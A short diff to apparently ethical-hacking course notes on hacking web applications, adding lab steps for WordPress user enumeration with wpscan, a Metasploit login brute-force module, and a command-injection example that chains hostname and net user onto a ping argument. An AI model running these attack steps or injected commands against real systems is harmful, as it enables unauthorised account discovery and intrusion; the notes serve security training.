@@ -2,6 +2,14 @@
 
 ## **Module 14: Hacking Web Applications**
 
+* Wordpress
+  * wpscan --url http://10.10.10.12:8080 --enumerate u
+* WP password bruteforce
+  * msfconsole
+  * use auxiliary/scanner/http/wordpress\_login\_enum
+* RCE&#x20;
+  * ping 127.0.0.1 | hostname | net user
+
 ### **Lab2-Task1: Perform a Brute-force Attack using Burp Suite**
 
 * Set proxy for browser: 127.0.0.1:8080
